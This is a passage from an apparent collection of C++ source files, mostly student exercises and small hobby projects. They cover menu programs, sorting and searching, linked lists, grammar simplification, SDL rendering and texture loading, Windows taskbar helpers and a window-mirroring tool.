endl;\r\n        cout << \"5. Keluar\" << endl;\r\n        cout << \"Pilih menu (1-5): \";\r\n        cin >> pilihan;\r\n\r\n        switch (pilihan) {\r\n        case 1:\r\n            tambahHewan(daftarHewan, &jumlahHewan);\r\n            break;\r\n        case 2:\r\n            tampilkanHewan(daftarHewan, jumlahHewan);\r\n            break;\r\n        case 3:\r\n            cout << \"Masukkan nama hewan yang ingin dicari: \";\r\n            cin >> namaHewan;\r\n            if (cariHewan(daftarHewan, jumlahHewan, namaHewan) != nullptr) {\r\n                cout << \"Hewan ditemukan!\" << endl;\r\n            } else {\r\n                cout << \"Hewan tidak ditemukan.\" << endl;\r\n            }\r\n            break;\r\n        case 4:\r\n            cout << \"Masukkan nama hewan yang ingin dihapus: \";\r\n            cin >> namaHewan;\r\n            hapusHewan(daftarHewan, &jumlahHewan, namaHewan);\r\n            break;\r\n        case 5:\r\n            cout << \"Keluar dari program.\" << endl;\r\n            break;\r\n        default:\r\n            cout << \"Pilihan tidak valid. Coba lagi.\" << endl;\r\n        }\r\n    } while (pilihan != 5);\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"TaskbarProgress.h\" \n\n//\u5fc5\u8981\u306a\u95a2\u6570\u30bb\u30c3\u30c8\u3092\u30a4\u30f3\u30dd\u30fc\u30c8\n#include \"windows.h\"\n#include \"shobjidl.h\"\n\n#include \"iostream\"  // \u30c7\u30d0\u30c3\u30b0\u7528\n\n//\u6307\u5b9a\u30a2\u30d7\u30ea\u30cf\u30f3\u30c9\u30eb\u306e\u30bf\u30b9\u30af\u30d0\u30fc\u306b\u3001\u30d7\u30ed\u30b0\u30ec\u30b9\u30d0\u30fc\u306e\u5024\u3068\u30b9\u30c6\u30fc\u30bf\u30b9\u3092\u6307\u5b9a\u3057\u307e\u3059\u3002\nvoid __stdcall SetTaskbarProgress(HWND hwnd, unsigned long current, unsigned long maximum, long status)\n{\n\t// ITaskbarList3\u30a4\u30f3\u30bf\u30fc\u30d5\u30a7\u30fc\u30b9\u3092\u53d6\u5f97\n\tITaskbarList3* pTaskbarList = nullptr;\n\tHRESULT hr = CoCreateInstance(CLSID_TaskbarList, nullptr, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pTaskbarList));\n\tif (FAILED(hr)) {\n\t\treturn;\n\t}\n\n\t// \u30bf\u30b9\u30af\u30d0\u30fc\u306e\u9032\u6357\u72b6\u614b\u3092\u8a2d\u5b9a\n\tpTaskbarList->SetProgressState(hwnd, static_cast<TBPFLAG>(status));\n\n\t// \u9032\u6357\u5024\u3092\u8a2d\u5b9a\n\tif (status == TBPF_NORMAL || status == TBPF_PAUSED || status == TBPF_ERROR) {\n\t\tpTaskbarList->SetProgressValue(hwnd, current, maximum);\n\t}\n\n\t// \u30ea\u30bd\u30fc\u30b9\u306e\u89e3\u653e\n\tpTaskbarList->Release();\n\n}\n\n//\u6307\u5b9a\u30a2\u30d7\u30ea\u30cf\u30f3\u30c9\u30eb\u306e\u30bf\u30b9\u30af \u30d0\u30fc \u30dc\u30bf\u30f3\u306b\u30aa\u30fc\u30d0\u30fc\u30ec\u30a4\u3092\u9069\u7528\u3057\u3066\u3001\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306e\u72b6\u614b\u307e\u305f\u306f\u901a\u77e5\u3092\u30e6\u30fc\u30b6\u30fc\u306b\u793a\u3057\u307e\u3059\u3002\nvoid __stdcall SetTaskbarOverlayIcon(HWND hwnd, const wchar_t* filePath, int iconIndex, const wchar_t* description)\n{\n    // ITaskbarList3\u30a4\u30f3\u30bf\u30fc\u30d5\u30a7\u30fc\u30b9\u3092\u53d6\u5f97\n    ITaskbarList3* pTaskbarList = nullptr;\n    HRESULT hr = CoCreateInstance(CLSID_TaskbarList, nullptr, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pTaskbarList));\n    if (FAILED(hr)) {\n        std::wcerr << L\"Failed to create ITaskbarList3 instance\" << std::endl;\n        return;\n    }\n\n    // filePath\u304cNULL\u304b\u7a7a\u6587\u5b57\u306e\u5834\u5408\u306f\u30a2\u30a4\u30b3\u30f3\u3092\u524a\u9664\u3059\u308b\n    if (filePath == nullptr || wcslen(filePath) == 0) {\n        hr = pTaskbarList->SetOverlayIcon(hwnd, NULL, NULL);\n        if (FAILED(hr)) {\n            std::wcerr << L\"Failed to remove overlay icon: \" << hr << std::endl;\n        }\n        pTaskbarList->Release();\n        return;\n    }\n\n    HICON hIcon = NULL;\n    std::wstring path(filePath);\n    std::wstring extension = path.substr(path.find_last_of(L\".\") + 1);\n\n    if (extension == L\"ico\") {\n        // .ico\u30d5\u30a1\u30a4\u30eb\u304b\u3089\u30a2\u30a4\u30b3\u30f3\u3092\u30ed\u30fc\u30c9\n        hIcon = (HICON)LoadImage(NULL, filePath, IMAGE_ICON, 0, 0, LR_LOADFROMFILE | LR_DEFAULTSIZE | LR_SHARED);\n        if (hIcon == NULL) {\n            std::wcerr << L\"Failed to load .ico file: \" << GetLastError() << std::endl;\n            pTaskbarList->Release();\n            return;\n        }\n    }\n    else if (extension == L\"exe\") {\n        // .exe\u30d5\u30a1\u30a4\u30eb\u304b\u3089\u30a2\u30a4\u30b3\u30f3\u3092\u30a4\u30f3\u30c7\u30c3\u30af\u30b9\u6307\u5b9a\u3067\u30ed\u30fc\u30c9\n        hIcon = ExtractIcon(NULL, filePath, iconIndex);\n        if (hIcon == NULL || hIcon == (HICON)1) {\n            std::wcerr << L\"Failed to extract icon from .exe file: \" << GetLastError() << std::endl;\n            pTaskbarList->Release();\n            return;\n        }\n    }\n    else if (extension == L\"dll\") {\n        // .dll\u30d5\u30a1\u30a4\u30eb\u304b\u3089\u30a2\u30a4\u30b3\u30f3\u3092\u30a4\u30f3\u30c7\u30c3\u30af\u30b9\u6307\u5b9a\u3067\u30ed\u30fc\u30c9\n        HMODULE hModule = LoadLibraryEx(filePath, NULL, LOAD_LIBRARY_AS_DATAFILE);\n        if (hModule == NULL) {\n            std::wcerr << L\"Failed to load .dll file: \" << GetLastError() << std::endl;\n            pTaskbarList->Release();\n            return;\n        }\n\n        hIcon = (HICON)LoadImage(hModule, MAKEINTRESOURCE(iconIndex), IMAGE_ICON, 0, 0, LR_DEFAULTSIZE | LR_SHARED);\n        if (hIcon == NULL) {\n            std::wcerr << L\"Failed to load icon from resource: \" << GetLastError() << std::endl;\n            FreeLibrary(hModule);\n            pTaskbarList->Release();\n            return;\n        }\n\n        FreeLibrary(hModule);\n    }\n    else {\n        std::wcerr << L\"Unsupported file type: \" << extension << std::endl;\n        pTaskbarList->Release();\n        return;\n    }\n\n    // \u30bf\u30b9\u30af\u30d0\u30fc\u306b\u30aa\u30fc\u30d0\u30fc\u30ec\u30a4\u30a2\u30a4\u30b3\u30f3\u3092\u8a2d\u5b9a\n    hr = pTaskbarList->SetOverlayIcon(hwnd, hIcon, description);\n    if (FAILED(hr)) {\n        std::wcerr << L\"Failed to set overlay icon: \" << hr << std::endl;\n    }\n\n    // \u30a2\u30a4\u30b3\u30f3\u3092\u89e3\u653e\n    DestroyIcon(hIcon);\n\n    // \u30ea\u30bd\u30fc\u30b9\u306e\u89e3\u653e\n    pTaskbarList->Release();\n}",
    "// Texture.cpp\n\n#include \"Texture.h\"\n#include <iostream>\n\nTexture::Texture(const std::string& filename) {\n    SDL_Surface* surface = IMG_Load(filename.c_str());\n    if (!surface) {\n        std::cerr << \"Error loading image: \" << filename << \", SDL Error: \" << IMG_GetError() << std::endl;\n        return;\n    }\n\n    width = surface->w;\n    height = surface->h;\n    pixels.resize(width * height);\n\n    SDL_LockSurface(surface);\n    Uint8* pixelData = static_cast<Uint8*>(surface->pixels);\n    SDL_PixelFormat* format = surface->format;\n    // E\u00f0er format 32-bit de\u00f0ilse, alfa kanal\u00fd olmayabilir\n    bool has_alpha = (surface->format->BitsPerPixel == 32);\n   \n    if (has_alpha) {\n        alphas.resize(width * height);\n    }\n    for (int y = 0; y < height; ++y) {\n        for (int x = 0; x < width; ++x) {\n            Uint8 r, g, b, a;\n            Uint32 pixel;\n            alphas.resize(width * height);\n            switch (format->BitsPerPixel) {\n            case 8: // 8-bit paletteli format\n            {\n\n                Uint8* p = pixelData + (y * surface->pitch) + x;\n                pixel = *p;               \n               \n                // Siyah-beyaz olup olmad\u00fd\u00f0\u00fdn\u00fd kontrol et\n                      // 8-bit paletteli format genellikle gri tonlama olarak kullan\u00fdl\u00fdr\n                if (r != g || r != b) {\n                    is_gray_scale = false;\n                }\n\n                // Gri tonlamal\u00fd piksellerin alfa de\u00f0erini olu\u00fetur\n                float gray = *p / 255.0f;\n                // Opacity map ise gri tonlamay\u00fd alfa olarak kullan\n                if (is_gray_scale) {\n                    alphas[y * width + x] = (gray == 0) ? 0.0f : 1.0f; // Siyah 0, Beyaz 1\n                }\n                else {\n                    pixels[y * width + x] = Vec3(gray / 255.0f, gray / 255.0f, gray / 255.0f);\n                }\n                SDL_GetRGBA(pixel, format, &r, &g, &b, &a);\n            }\n            break;\n            case 15: // 15-bit format (5-5-5)\n            case 16: // 16-bit format (5-6-5 veya 5-5-5-1)\n            {\n                Uint16* p = reinterpret_cast<Uint16*>(pixelData + (y * surface->pitch));\n                pixel = p[x];\n                SDL_GetRGBA(pixel, format, &r, &g, &b, &a);\n            }\n            break;\n            case 24: // 24-bit format\n            {\n                Uint8* p = pixelData + (y * surface->pitch) + (x * 3);\n                if (SDL_BYTEORDER == SDL_BIG_ENDIAN) {\n                    pixel = (p[0] << 16) | (p[1] << 8) | p[2];\n                }\n                else {\n                    pixel = p[0] | (p[1] << 8) | (p[2] << 16);\n                }\n                SDL_GetRGB(pixel, format, &r, &g, &b);\n                a = 255; // 24-bit formatlar genellikle alfa kanal\u00fd i\u00e7ermez\n            }\n            break;\n            case 32: // 32-bit format\n            {\n                Uint32* p = reinterpret_cast<Uint32*>(pixelData + (y * surface->pitch));\n                pixel = p[x];\n                SDL_GetRGBA(pixel, format, &r, &g, &b, &a);\n            }\n            break;\n            default:\n                std::cerr << \"Unsupported pixel format: \" << static_cast<int>(format->BitsPerPixel) << \" bits per pixel.\" << std::endl;\n                SDL_UnlockSurface(surface);\n                SDL_FreeSurface(surface);\n                return; // Desteklenmeyen format durumunda fonksiyondan \u00e7\u00fdk\n            }\n\n            // Debug output to check pixel values\n            // std::cout << \"Pixel (\" << x << \", \" << y << \"): R=\" << static_cast<int>(r) << \", G=\" << static_cast<int>(g) << \", B=\" << static_cast<int>(b) << \", A=\" << static_cast<int>(a) << std::endl;\n\n            float normalized_r = r / 255.0f;\n            float normalized_g = g / 255.0f;\n            float normalized_b = b / 255.0f;\n            float normalized_a = a / 255.0f;\n            if (has_alpha) {\n                alphas[y * width + x] = normalized_a;  // Sadece alfa kanal\u00fd varsa yazma i\u00felemi yap\n            }\n            // Alfa de\u00f0erini de kullanmak isterseniz:\n            // pixels[y * width + x] = Vec4(normalized_r, normalized_g, normalized_b, normalized_a);\n            // E\u00f0er Vec3 kullanmaya devam etmek istiyorsan\u00fdz:\n            pixels[y * width + x] = Vec3(normalized_r, normalized_g, normalized_b);\n        }\n    }\n\n\n    SDL_UnlockSurface(surface);\n    SDL_FreeSurface(surface);\n}\n\nfloat Texture::get_alpha(double u, double v) const {\n    if (width <= 0 || height <= 0 || alphas.empty()) {\n        return 1.0f; // Ge\u00e7erli bir opakl\u00fdk haritas\u00fd yoksa varsay\u00fdlan opakl\u00fdk\n    }\n\n    u = std::clamp(u, 0.0, 1.0);\n    v = std::clamp(v, 0.0, 1.0);\n\n    int x = static_cast<int>(u * (width - 1));\n    int y = static_cast<int>((1 - v) * (height - 1));\n\n    x = std::clamp(x, 0, width - 1);\n    y = std::clamp(y, 0, height - 1);\n\n    // E\u00f0er gri tonlamal\u00fdysa, do\u00f0rudan alfa kanal\u00fdn\u00fd kullan\n    if (is_gray_scale) {\n        return alphas[y * width + x];\n    }\n\n    return alphas[y * width + x]; // Normal opakl\u00fdk haritas\u00fd\n}\n\n\nvoid Texture::lo",
    "#define STB_IMAGE_IMPLEMENTATION\n#include \"stb_image.h\"\n#include <iostream>\n#include <vector>\n#include <string>\n\n// Extended ASCII characters used for different intensity levels\nconst unsigned char EXTENDED_ASCII_CHARS[] = {0x20, 0xFF, 0xB0, 0xB1, 0xB2, 0xDB, 0xFE};\n\n// Ensure the number of ASCII characters matches the array size\nconst int NUM_ASCII_CHARS = sizeof(EXTENDED_ASCII_CHARS) / sizeof(EXTENDED_ASCII_CHARS[0]);\n\n// Function to map brightness (grayscale) to an extended ASCII character\nchar getAsciiChar(int intensity) {\n    int index = (intensity * (NUM_ASCII_CHARS - 1)) / 255;\n    return EXTENDED_ASCII_CHARS[index];\n}\n\n// Function to convert grayscale value to an ANSI color code\nstd::string getAnsiColorCode(int r, int g, int b) {\n    return \"\\033[48;2;\" + std::to_string(r) + \";\" + std::to_string(g) + \";\" + std::to_string(b) + \"m\";\n}\n\n// Function to load an image and convert it to ASCII art stored in a matrix\nstd::vector<std::vector<std::pair<std::string, char>>> convertImageToAsciiMatrix(const std::string& imagePath, int width, int height) {\n    // Load the image (returns pixel data, width, height, and number of channels)\n    int imgWidth, imgHeight, channels;\n    unsigned char* imgData = stbi_load(imagePath.c_str(), &imgWidth, &imgHeight, &channels, 0);\n    if (!imgData) {\n        std::cerr << \"Error: Could not load image: \" << imagePath << std::endl;\n        exit(-1);\n    }\n\n    // Resize the image to fit within the terminal\n    int newWidth = width;\n    int newHeight = (height * imgHeight) / imgWidth;  // Preserve aspect ratio\n\n    // Create a 2D matrix to store the ASCII characters and their color codes\n    std::vector<std::vector<std::pair<std::string, char>>> asciiMatrix(newHeight, std::vector<std::pair<std::string, char>>(newWidth));\n\n    // Iterate through the resized image and populate the matrix with ASCII characters and colors\n    for (int y = 0; y < newHeight; ++y) {\n        for (int x = 0; x < newWidth; ++x) {\n            // Calculate the corresponding pixel in the original image\n            int origX = (x * imgWidth) / newWidth;\n            int origY = (y * imgHeight) / newHeight;\n            int pixelIndex = (origY * imgWidth + origX) * channels;\n\n            // Calculate the RGB values\n            int r = imgData[pixelIndex];\n            int g = imgData[pixelIndex + 1];\n            int b = imgData[pixelIndex + 2];\n            int grayscale = (r + g + b) / 3;\n\n            // Map the grayscale value to an extended ASCII character\n            char asciiChar = getAsciiChar(grayscale);\n\n            // Generate the ANSI color code for the current pixel\n            std::string colorCode = getAnsiColorCode(r, g, b);\n\n            // Store the color code and ASCII character in the matrix\n            asciiMatrix[y][x] = {colorCode, asciiChar};\n        }\n    }\n\n    // Free the image data loaded by stb_image\n    stbi_image_free(imgData);\n\n    return asciiMatrix;\n}\n\n// Function to display the ASCII matrix in the terminal with colors\nvoid displayAsciiMatrix(const std::vector<std::vector<std::pair<std::string, char>>>& matrix) {\n    for (const auto& row : matrix) {\n        for (const auto& pixel : row) {\n            // Print the color code and ASCII character\n            std::cout << pixel.first << pixel.second;\n        }\n        std::cout << \"\\033[0m\" << std::endl; // Reset color at the end of the line\n    }\n}\n\nint main() {\n    // Path to the image file\n    std::string imagePath = \"./ascii.png\";\n\n    // Define the terminal width and height for ASCII art (adjust as needed)\n    int terminalWidth = 50;\n    int terminalHeight = 25;\n\n    // Convert the image to an ASCII matrix\n    std::vector<std::vector<std::pair<std::string, char>>> asciiMatrix = convertImageToAsciiMatrix(imagePath, terminalWidth, terminalHeight);\n\n    // Display the ASCII art in the terminal with colors\n    displayAsciiMatrix(asciiMatrix);\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <chrono>\n\nusing namespace std;\nusing namespace std::chrono;\n\nextern \"C\" int funk_asm(int a, int b);\nextern \"C\" void print(const char *ciong);\n\nint funk_cpp(int a, int b)\n{\n    return a+b;\n}\n\n\nint main()\n{   \n    // int a = 10, b = 5, w_asm = 0, w_cpp = 0;\n\n    // auto start1 = high_resolution_clock::now();\n    // w_cpp = funk_cpp(a,b);\n    // auto end1 = high_resolution_clock::now();\n    // duration<double, nano> czascpp = end1 - start1;\n\n\n    // auto start = high_resolution_clock::now();\n    // w_asm = funk_asm(a,b);\n    // auto end = high_resolution_clock::now();\n    // duration<double, nano> czasasm = end - start;\n\n    \n    \n    // cout<<\"wynik fukncji i czas asm: \"<<w_asm<<\", \"<<czasasm.count()<<endl;\n    // cout<<\"wynik fukncji i czas cpp: \"<<w_cpp<<\", \"<<czascpp.count()<<endl;\n\n\n    const char* message = \"aha okok\\n\";\n    \n    auto start1 = high_resolution_clock::now();\n    operator<<(cout, message);\n    auto end1 = high_resolution_clock::now();\n    duration<double, nano> czascpp = end1 - start1;\n    \n\n    auto start = high_resolution_clock::now();\n \n    print(message);\n    auto end = high_resolution_clock::now();\n    duration<double, nano> czasasm = end - start;\n\n   \n    cout<<\"czas asm: \"<<czasasm.count()<<endl;\n    cout<<\"czas cpp: \"<<czascpp.count()<<endl;\n\n    return 0;\n}",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n    int size, i, j;\r\n    cin >> size;\r\n    int arr[size];\r\n    for(int i=0; i<size; i++)\r\n    {\r\n        cin >> arr[i];\r\n    }\r\n    int pos = -1, temp;\r\n    int low = 0, high = size - 1, middle;\r\n\r\n    for(i=0; i<size-1; i++)\r\n    {\r\n        for(j=0; j<size-1; j++)\r\n        {\r\n            if(arr[j] > arr[j+1])\r\n            {\r\n                temp = arr[j];\r\n                arr[j] = arr[j+1];\r\n                arr[j+1] = temp;\r\n            }\r\n        }\r\n    }\r\n    int val;\r\n    cin >> val;\r\n\r\n    while(low <= high)\r\n    {\r\n        middle = (low + high) / 2;\r\n        if (val == arr[middle])\r\n        {\r\n            pos = middle;\r\n            break;\r\n        }\r\n        else if (val < arr[middle])\r\n        {\r\n            high = middle - 1;\r\n        }\r\n        else\r\n        {\r\n            low = middle + 1;\r\n        }\r\n    }\r\n\r\n    if(pos == -1)\r\n        printf(\"not found\\n\");\r\n    else\r\n        printf(\"found\");\r\n\r\n    return 0;\r\n}\r\n",
    "\n#include \"function.cpp\"\n\nint main()\n{ \n    std::vector<Student> registru;\n    int alegere = 1;\n    int alegere2,alegere3;\n    int studentId,disciplinID;\n\n    while (alegere != 0)\n    {\n        mainMenu();\n        std::cin >> alegere;\n        switch (alegere)\n        {\n        case 1:\n            addStudent(registru);\n            break;\n        case 2:\n           studentList(registru);\n        break;\n          \n        case 3:\n         addPereche(registru);\n        break;\n        case 4:\n         highestMedie(registru);\n        break;\n\n        case 5:\n         highestAbsente(registru);\n        break;\n\n        case 6:\n          std::cout << \"Da ID-ul studentului, (din lista) \\n\";\n          std::cin >> studentId;\n          alegere2 = 1;\n          while (alegere2 != 0)\n          {\n            studentMenu();\n            std::cin >> alegere2;\n             switch (alegere2)\n             {\n             case 1:\n                studentName(registru,studentId);\n                break;\n             case 2:\n                printDiscipline(registru);\n                break;\n             \n             case 3:\n                  std::cout << \"Media : \" << registru[studentId].medie << '\\n';\n                 break;\n             case 4:\n                  std::cout << registru[studentId].numAbsente << \" absente \\n\";\n                break;\n             case 5:\n                  std::cout << \"Alege o anumita disciplina, dupa id \\n\";\n                  std::cin >> disciplinID;\n                  alegere3 = 1;\n                  while (alegere3 != 0)\n                  {\n                    disciplinaMenu();\n                    std::cin >> alegere3;\n                    switch (alegere3)\n                    {\n                    case 1:\n                        numeDiscipline(registru,studentId,disciplinID);\n                        break;\n                    case 2:\n                        addMedie(registru,studentId,disciplinID);\n                    break;\n\n                    case 3:\n                         printMedie(registru,studentId,disciplinID);\n                    break;\n\n                    case 4:\n                        addAbsenta(registru,studentId,disciplinID);\n                    break;\n\n                    case 5:\n                          printAbsente(registru,studentId,disciplinID);\n                    break;\n                    \n                    default:\n                        break;\n                    }\n                  }\n                  \n                break;\n             default:\n                break;\n             }\n          }\n          \n        break;\n        \n        default:\n            break;\n        }\n    }\n    \n    \n\n    \n}\n",
    "#include <iostream>\n#include <assert.h>\n#include \"CreateWindow.h\"\n#include \"global.h\"\n#include \"Renderer.h\"\n#include \"WindowsManager.h\"\n\nHWND mainWindowHandle;\nHWND targetHandle;\nRECT targetRect;\n\nint windowX = 0;\nint windowY = 0;\n\nconst bool CONSOLE_ENABLED = false;\n\nint main() {\n\n\t/*if (CONSOLE_ENABLED)\n\t{\n\t\t::AllocConsole();\n\t\tFILE* pCout;\n\t\tfreopen_s(&pCout, \"CONOUT$\", \"w\", stdout);\n\t}*/\n\t\n\t::EnumWindows(enumWindowsProc, NULL);\n\n\tlistWindows();\n\n\tstd::cout << \"Type in the number of the window to be mirrored: \";\n\tint input;\n\tstd::cin >> input;\n\tstd::cin.get();\n\n\t//mainWindowHandle = CreateMainWindow(hInstance);\n\tmainWindowHandle = CreateMainWindow(NULL);\n\n\tif (mainWindowHandle == NULL) \n\t{\n\t\treturn 0;\n\t}\n\n\t//ShowWindow(mainWindowHandle, nCmdShow);\n\t::ShowWindow(mainWindowHandle, SW_SHOW);\n\n\ttargetHandle = windowsHandles.at(input - 1);\n\tHDC targetDC = ::GetDC(targetHandle);\n\tHDC mainDC = ::GetDC(mainWindowHandle);\n\n\t::GetWindowRect(targetHandle, &targetRect);\n\n\tINT_PTR target = (input - 1);\n\t::CreateThread(NULL, 0, mirrorWindow, reinterpret_cast<LPVOID>(target), 0, NULL);\n\n\tMSG msg;\n\twhile (GetMessage(&msg, mainWindowHandle, 0, 0))\n\t{\n\t\t::TranslateMessage(&msg);\n\t\t::DispatchMessage(&msg);\n\t}\n\n\treturn 1;\n}\n\n",
    "#include <iostream>\n#include <utility>\n#include <vector>\n#include <algorithm>\n#include <string>\n#include <sstream>\n#include <bitset>\n#include <cmath>\n#include <unordered_set>\n\n#define DEBUG 0\n\nusing namespace std;\n\nclass rule {\npublic:\n    string hs;\n    string lhs;\n    vector<string> rhs;\n\n    // parse string to lhs and rhs\n    void parseHs() {\n        hs.erase(std::remove(hs.begin(), hs.end(), ' '), hs.end());\n        size_t pos = hs.find(\"->\");\n        lhs = hs.substr(0, pos);\n        string rhsString = hs.substr(pos + 2);\n        stringstream sss(rhsString);\n        string token;\n        while (getline(sss, token, '|'))\n            rhs.push_back(token);\n    }\n\n    void print() {\n        cout << lhs << \" -> \";\n        for (auto i = 0; i < rhs.size(); i++) {\n            if (i == rhs.size() - 1) {\n                cout << rhs[i];\n            } else {\n                cout << rhs[i] << \" | \";\n            }\n        }\n    }\n\n\n    rule() {\n        getline(std::cin, hs);\n        parseHs();\n    }\n\n    explicit rule(string hs) {\n        this->hs = std::move(hs);\n        parseHs();\n    }\n\n    ~rule() {\n        vector<string>().swap(rhs);\n    }\n};\n\nbool operator==(const rule &x, const rule &y) {\n    return x.hs == y.hs && x.lhs == y.lhs && x.rhs == y.rhs;\n}\n\nbool operator<(const rule &x, const rule &y) {\n    if (x.hs != y.hs) return x.hs < y.hs;\n    if (x.lhs != y.lhs) return x.lhs < y.lhs;\n    return x.rhs < y.rhs;\n}\n\nclass grammar {\npublic:\n    vector<pair<rule, bool>> rules;\n    vector<string> nullVar,  allVar;\n    vector<string> newProduction;\n    vector<string> accessibleVar;\n    vector<vector<int>> unitProPos;\n\n    void print() {\n        for (auto i: rules) {\n            i.first.print();\n            cout << endl;\n        }\n    }\n\n    // remove nullable variable\n    void rmNullVar() {\n        while (findNull()) {\n            // iterate in null variable\n            for (const auto &nvar: nullVar) {\n                // iterate in all grammar rules\n                for (auto &gram: rules) {\n                    // iterate in rule rhs and create new production when removing null\n                    newProduction.clear();\n                    newProduction.shrink_to_fit();\n                    for (const auto &unit: gram.first.rhs) {\n                        string u{unit};\n                        int count{};\n                        // replace all null variable with $ and count number of it\n                        while (u.find(nvar) != string::npos) {\n                            u.replace(u.find(nvar), nvar.length(), \"$\");\n                            count++;\n                        }\n                        // calculate number of bit for creating combination\n                        count = ceil(sqrt(count));\n                        // create all combination with assigning null to variable\n                        for (auto i = 0; i < pow(count, 2); i++) {\n                            bitset<16> b(i);\n                            string bs = b.to_string(), up{};\n                            int index{15};\n                            for (auto j: u) {\n                                if (j == '$' && bs[index] == '0') {\n                                    index--;\n                                    continue;\n                                } else if (j == '$' && bs[index] == '1') {\n                                    index--;\n                                }\n                                up += j;\n                            }\n                            // replace all $ with null variable\n                            while (up.find('$') != string::npos) {\n                                up.replace(up.find('$'), 1, nvar);\n                            }\n                            if (up.empty()) up = \"$\";\n                            newProduction.push_back(up);\n                        }\n                    }\n                    // add new production to rhs of rule\n                    gram.first.rhs.insert(gram.first.rhs.end(), newProduction.begin(), newProduction.end());\n                    // remove duplicate from rhs\n                    unordered_set<string> rmdp;\n                    auto end = std::remove_copy_if(gram.first.rhs.begin(), gram.first.rhs.end(), gram.first.rhs.begin(),\n                                                   [&rmdp](string const &i) { return !rmdp.insert(i).second; });\n                    gram.first.rhs.erase(end, gram.first.rhs.end());\n                }\n            }\n            int ind{};\n            for (auto &i: rules) {\n                for (auto &j: i.first.rhs) {\n                    // set flag of rule that their null production is removed\n                    if (j == \"#\") {\n                        i.second = true;\n                    } else if (j == \"$\") {\n                        j = \"#\";\n                    }\n                }\n                if (i.second)\n                    i.first.rhs.erase(remove(i.first.rhs.begin(), i.first.rhs.end(), \"#\"), i.first.rhs.end());\n                // remove r",
    "#include <iostream>\nusing namespace std;\nclass node{\n    public:\n    int data;\n    node* next;\n     //constructor \n    node(int value){\n        data=value;\n        next= nullptr;\n    }\n};\nvoid insertAtNode(node*& head,  int element){\n    node* newN= new node(element);\n    if(head==nullptr){\n        head=newN;\n        return;\n    }\n    node* temp= head;\n    //transversing to the last node\n    while(temp->next!= nullptr){\n        temp= temp->next;\n    }\n    temp->next=newN;\n}\nvoid display(node* head){\n    node* tem= head;\n    while(tem!=nullptr){\n        cout<<tem->data<<\"->\";\n        tem=tem->next;\n    }\n    cout<<\"NULL\"<<endl;\n}\nvoid deleteTheF(node*& head){\n    node* del= head;\n    head=head->next;\n    delete del;\n}\nvoid deleteTheL(node*& head){\n    //if list has no elements\n    if(head==nullptr){\n        return;\n    }\n    //if list has only one element\n    if(head->next==nullptr){\n        delete head;\n        head= nullptr;\n        return;\n    }\n    node* temp= head;\n    //We have to transverse to the last second\n    while(temp->next->next!=nullptr){\n        temp=temp->next;\n    }\n    node* del = temp->next;\n    temp->next=nullptr;\n    delete del;\n}\nvoid deleteAtP(node*& head, int position){\n    //If list is empty\n    node* temp= head;\n    if(head==nullptr){\n        return;\n    }\n    //if it is on 0th position element\n    if(position==0){\n        head= temp->next;//change head to the next node\n        delete temp;//delete the old memory\n        return;\n    }\n    //iterating to position last element---\n    for(int i = 0 ; temp != nullptr && i<position-1; i++){\n        temp=temp->next;\n    }\n    //node to be deleted is the node next to the node at which we currently are\n    if(temp== nullptr || temp->next== nullptr){\n        cout<<\"Position out of range\"<<endl;\n        return;\n    }\n    node* delp= temp->next;\n    //jo node delete krna hain uske phele wale ko uske agle se agle mtlb ki n node k n+1 se link kr rha\n    temp-> next= temp->next->next;\n    delete delp;\n    \n}\nint main(){\n    node* head= nullptr;\n    int n;\n    cout<<\"Number of elements in the linked list: \";\n    cin>>n;\n    cout<<\"Enter elements: \";\n    for(int i=0; i<n; i++){\n        int element;\n        cin>>element;\n        insertAtNode(head, element);\n    }\n    int valueP;\n    cout<<\"enter the position to be deleted: \";\n    cin>>valueP;\n    display(head);\n    cout<<\"Delete the first-->\"<<endl;\n    deleteTheF(head);\n    display(head);\n    cout<<\"Delete the last-->\"<<endl;\n    deleteTheL(head);\n    display(head);\n    cout<<\"Delete at the \"<<valueP<<\"th position -->\"<<endl;\n    deleteAtP(head,valueP);\n    display(head);\n    return 0;\n\n}\n",
    "#include \"Physics/Obstacle.h\"\r\n#include \"Utility/Vector2D.h\"\r\n#include \"Renderer/Renderer.h\"\r\n#include \"Renderer/RenderObject.h\"\r\n#include \"Utility/ObjectUtility.h\"\r\n#include \"Utility/ObjectUtility.h\"\r\n#include \"Entity/Entity.h\"\r\n#include \"Physics/PhysicsCalculator.h\"\r\n#include \"Physics/IPhysicsObject.h\"\r\n#include <iostream>\r\n#include <memory>\r\n#include <chrono>\r\n\r\nint main(int argc, char* args[])\r\n{\r\n    Obstacle box = Obstacle(2, 2);\r\n    SDL_Init(SDL_INIT_EVERYTHING);\r\n    Rend::Renderer rend = Rend::Renderer(1920 ,1080);\r\n\r\n    bool exit = false;\r\n    SDL_Event eventData;\r\n    physics::PhysicsCalculator physicsCalc = physics::PhysicsCalculator();\r\n\r\n    std::shared_ptr<Ent::Entity> temp1 = std::make_shared<Ent::Entity>();\r\n    rend.addObjectToRender(temp1);\r\n    temp1->position = Utility::Vector2D<double>(temp1->getPosOfObject().first, temp1->getPosOfObject().second);\r\n    temp1->velocity = Utility::Vector2D<double>(0.0, 10.0);\r\n    temp1->acceleration = Utility::Vector2D<double>(10.0, 10.0);\r\n\r\n    std::shared_ptr<Ent::Entity> temp2 = std::make_shared<Ent::Entity>();\r\n    temp2->setWidhtAndHeight({30, 500});\r\n    temp2->setPoistionXY({500,50});\r\n    //rend.addObjectToRender(temp2);\r\n\r\n    std::shared_ptr<Ent::Entity> temp3 = std::make_shared<Ent::Entity>();\r\n    temp3->setWidhtAndHeight({30, 500});\r\n    temp3->setPoistionXY({0,50});\r\n    //rend.addObjectToRender(temp3);\r\n\r\n    bool running = true;\r\n    Uint32 frameStart;\r\n    int frameTime;\r\n    int frameCount = 0;\r\n    const int FPS = 144.;\r\n    const int frameDelay = 1000 / FPS;\r\n    Uint32 lastTime = SDL_GetTicks();  \r\n    Uint32 fpsTimer = 0;       \r\n\r\n    Utility::ObjectUtility utility;\r\n\r\n    int32_t dir = 5;\r\n    while (running)\r\n    {\r\n        frameStart = SDL_GetTicks();\r\n\r\n        rend.renderBackground(255,0,0,255);\r\n\r\n        // Event handling\r\n        while (SDL_PollEvent(&eventData)) {\r\n            if 